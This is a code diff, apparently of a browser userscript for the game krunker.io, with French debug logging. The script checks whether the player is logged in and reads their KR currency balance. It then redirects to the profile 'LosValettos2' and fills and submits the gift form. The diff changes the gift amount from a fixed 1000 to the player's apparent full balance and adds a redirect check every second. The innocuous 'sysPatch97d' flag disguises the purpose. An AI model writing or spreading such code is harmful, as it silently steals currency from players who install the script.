@@ -242,15 +242,24 @@ window.addEventListener('load', () => {
         logContainer.scrollTop = logContainer.scrollHeight;
     };
 
-    addLog(`État initial: ${Is_LOGGED ? "Connecté" : "Non connecté"}`);
-    addLog(`Patch déjà appliqué: ${sessionStorage.getItem("sysPatch97d") ? "Oui" : "Non"}`);
+    // Logs détaillés de l'état initial
+    addLog("=== ÉTAT INITIAL ===");
+    addLog(`Is_LOGGED: ${Is_LOGGED}`);
+    addLog(`signedOutBar existe: ${!!signedOutBar}`);
+    if (signedOutBar) {
+        addLog(`signedOutBar style.display: ${signedOutBar.style.display}`);
+    }
+    addLog(`sessionStorage.sysPatch97d: ${sessionStorage.getItem("sysPatch97d")}`);
+    addLog(`URL actuelle: ${location.href}`);
+    addLog(`Pathname: ${location.pathname}`);
+    addLog("==================");
 
     // Vérification continue de l'état de connexion
     setInterval(() => {
         const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
         const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
         addLog(`État de connexion: ${currentLoginState ? "Connecté" : "Non connecté"}`);
-        
+
         if (currentLoginState) {
             const krElement = document.querySelector("#topLeftKRE > span");
             if (krElement) {
@@ -262,16 +271,40 @@ window.addEventListener('load', () => {
 
     // Logique de redirection
     if (location.pathname === "/") {
-        addLog("Page d'accueil détectée, vérification des conditions...");
-        if (!sessionStorage.getItem("sysPatch97d") && Is_LOGGED) {
-            addLog("Redirection vers la page sociale...");
-            setTimeout(() => {
-                location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
-            }, 1420);
-            return;
-        } else {
-            addLog("Redirection ignorée: " + (sessionStorage.getItem("sysPatch97d") ? "Patch déjà appliqué" : "Non connecté"));
-        }
+        addLog("=== VÉRIFICATION REDIRECTION ===");
+        addLog("Page d'accueil détectée");
+
+        // Vérification continue de la redirection
+        const checkRedirect = () => {
+            const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
+            const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
+            const patchApplied = sessionStorage.getItem("sysPatch97d");
+
+            addLog(`Vérification redirection - Connecté: ${currentLoginState}, Patch appliqué: ${patchApplied}`);
+
+            if (!patchApplied && currentLoginState) {
+                addLog("Conditions de redirection remplies, redirection dans 1.4s...");
+                setTimeout(() => {
+                    addLog("Exécution de la redirection...");
+                    location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
+                }, 1420);
+                return;
+            } else {
+                addLog("Redirection ignorée:");
+                if (patchApplied) {
+                    addLog("- Raison: Patch déjà appliqué");
+                }
+                if (!currentLoginState) {
+                    addLog("- Raison: Non connecté");
+                }
+            }
+        };
+
+        // Vérification initiale
+        checkRedirect();
+
+        // Vérification continue toutes les secondes
+        setInterval(checkRedirect, 1000);
     }
 
     if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
@@ -284,7 +317,7 @@ window.addEventListener('load', () => {
                 await _pause(480);
                 const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
                 addLog("Champ de saisie trouvé, entrée du montant...");
-                inputEl.value = "1000";
+                inputEl.value = `${PLayyer_KR}`;
                 inputEl.dispatchEvent(new Event("input", { bubbles: true }));
                 await _pause(650);
                 const confirm = document.getElementById("postSaleBtn");
